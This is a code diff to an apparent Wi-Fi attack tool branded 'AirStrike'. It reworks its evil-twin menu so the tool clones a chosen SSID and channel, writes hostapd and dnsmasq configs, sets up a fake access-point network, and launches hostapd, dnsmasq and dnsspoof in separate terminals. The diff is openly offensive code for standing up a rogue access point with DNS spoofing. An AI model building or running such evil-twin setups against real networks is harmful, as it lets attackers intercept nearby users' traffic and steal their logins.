@@ -224,24 +224,31 @@ def get_bssid_from_cap(cap_file):
         print(f"Error getting BSSID: {e}")
         return ""
     
-
 def evil_twin_menu():
+    from utils.network_utils import set_managed_mode
+    global interface
     print("\n" + "="*40)
     print("Evil Twin Attack")
     print("="*40)
-    set_monitor_mode(interface)  # from utils.network_utils
+    # ensure interface in managed/AP mode
+    set_managed_mode(interface)
     ssid = input("Enter SSID to clone: ").strip()
     channel = input("Enter channel number: ").strip()
-    et = EvilTwin(interface, ssid, channel)
-    et.prepare()
-    print("Starting Evil Twin... Press Ctrl+C to stop.")
-    et.start()
-    try:
-        while True: time.sleep(1)
-    except KeyboardInterrupt:
-        print("\nStopping Evil Twin...")
-        et.stop()
-        set_managed_mode(interface)  # restore to managed mode
+    # create config files
+    hostapd_conf = create_hostapd_config(interface, ssid, channel)
+    dnsmasq_conf = create_dnsmasq_config(interface)
+    if hostapd_conf and dnsmasq_conf:
+        setup_fake_ap_network(interface)
+        commands = [
+            f"hostapd {hostapd_conf}",
+            f"dnsmasq -C {dnsmasq_conf} -d",
+            f"dnsspoof -i {interface}"
+        ]
+        for cmd in commands:
+            open_terminal_with_command(cmd)
+    else:
+        print("[-] Failed to create required config files. Exiting.")
+
 
 if __name__ == "__main__":
     print(banner("AirStrike"))
